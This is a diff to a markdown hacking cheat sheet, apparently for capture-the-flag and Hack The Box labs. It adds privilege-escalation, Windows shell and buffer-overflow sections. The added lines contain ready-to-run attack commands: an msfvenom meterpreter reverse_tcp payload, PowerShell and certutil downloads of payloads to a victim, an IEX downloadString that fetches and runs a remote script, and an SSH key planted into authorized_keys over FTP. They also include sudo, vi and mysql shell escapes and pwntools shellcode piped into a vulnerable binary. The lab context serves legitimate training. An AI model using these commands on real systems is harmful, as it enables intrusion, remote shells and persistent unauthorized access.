@@ -16,7 +16,6 @@ tags:
 ---
 
 # System Hacking
-
 * To discover the system in the network, use either Nmap or Netdiscover
 * To scan for vulnerabilities use nikto.
   * Command to run : `nikto -h <HOST_IP>`
@@ -77,7 +76,7 @@ tags:
 * We can use ltrace to track all app + library calls.
   * Command: `ltrace ./<PROG_NAME>`
 
-# Crypto
+# Cryptography
 * If there is word `caesar` in the question or hint, this can be a substitution cipher.
   * Use this website www.dcode.fr/caesar-cipher to Bruteforce the hidden message.
 
@@ -100,6 +99,98 @@ tags:
 # Packet Capture
 * If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
   * Example Command : `tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields`
+  
+# Privilige Escalation
+* [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
+* [Lin Enum Script](https://github.com/rebootuser/LinEnum)
+* [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
+* To Use DirtyCow : [Link](https://dirtycow.ninja/) -- Maybe more specifically : [Dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
+* Trick to paste code in VI, with format on remote machines `set paste`
+* Try `sudo -l` to check what can be run with no-password.
+* For windows:
+  * In meterpreter shell try `getsystem`
+  * In meterpreter shell try `background` and then follow rest of commands...
+  * search suggester
+  * `use post/multi/recon/local_exploit_suggestor` (Example only)
+  * `show options`
+  * `set session 1`
+  * `run`
+  * If worked fine, else Try follow rest of commands...
+  * Use this link: [FuzzySec Win Priv Exec](https://www.fuzzysecurity.com/tutorials/16.html)
+  * Use this method: [Sherlock](https://github.com/rasta-mouse/Sherlock)
+  * If current process doesnt own Privs, use `migrate <PID>` to get more Priviliges in Meterpretor.
+* For Linux:
+  * If `sudo -l` gives something like this...
+  ```
+  User www-data may run the following commands on bashed:
+    (enemy : enemy) NOPASSWD: ALL
+  ```
+  We can try like below
+  ```
+  $ sudo -u enemy /bin/bash
+  id
+  uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
+  ```
+  * If `sudo -l` gives something like this ...
+  ```
+  notch@Blocky:~$ sudo -l
+  [sudo] password for notch: 
+  Matching Defaults entries for notch on Blocky:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ 
+  User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL
+  notch@Blocky:~$ cat /root/root.txt
+  cat: /root/root.txt: Permission denied   -- Does not work
+  notch@Blocky:~$ sudo cat /root/root.txt  -- Works
+  ```
+  * If we were able to access FTP and still no root access, we can do like this ...
+  ```
+  # ftp 10.10.10.37
+  Connected to 10.10.10.37.
+  220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
+  Name (10.10.10.37:root): enemy
+  331 Password required for enemy
+  Password:
+  230 User notch logged in
+  Remote system type is UNIX.
+  Using binary mode to transfer files.
+  ftp> put id_rsa.pub
+  ftp> rename id_rsa.pub authorized_keys
+  ```
+  * To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
+  ```
+  root# /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333 
+  [*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...
+  root# msfconsole -r unicorn.rc 
+  [*] Started reverse TCP handler on <HOST_IP>:3333 
+  msf5 exploit(multi/handler) > 
+  ```
+  * To get Better Shell on windows : Once a basic command shell has been obtained, it can be elevated to a Meterpreter shell by
+  generating an executable payload with the command `msfvenom -p windows/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe > writeup.exe` and then downloaded on the target with the command `powershell "(new-object   System.Net.WebClient).Downloadfile('http://<IP>/writeup.exe', 'writeup.exe')"`   Once a full Meterpreter shell has been obtained, it is a good idea to migrate to a process with the correct architecture. In this case jrunsvc.exe will work. Running local_exploit_suggester in 64-bit mode reveals only one suggestion; `exploit/windows/local/ms10_092_schelevator` . Running the module immediately grants an
+  elevated Meterpreter session.
+  
+  * Windows Enumeration Script:
+  ```
+  PS C:\Users\L4mpje\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7:8000/jaws-enum.ps1')       
+
+  Running J.A.W.S. Enumeration                                                                                           
+                
+  ```
+  
+  The root flag can be obtained from:
+  * Get Shell from MYSQL
+  ```
+  mysql> \! /bin/sh
+  ```
+  * To get Root from VI
+  ```www-data@enemy:/home/haris$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt ```
+  or
+  ```www-data@enemy:/home/haris$ sudo /usr/bin/vi /var/www/html/anyrandomFile
+  Type Escape and enter :!/bin/bash
+  ```
+  * Use [Pspy](https://github.com/DominicBreuker/pspy) for Getting information on cron, proceses etc
 
 # Tools
 * Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
@@ -120,3 +211,13 @@ tags:
 * If Tomcat is Opened, upload the file/payload using the Admin panel.
 * If wordpress is running, upload the file as plugin.
 * In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
+
+## Powershell
+* To bypass execution policy `powershell.exe -exec bypass`
+
+## BufferOverflow
+* To generate shellcode quickly, we can use..
+  * `python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh))`
+  * `(python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh()))" ;cat) | ./vuln`
+  
+
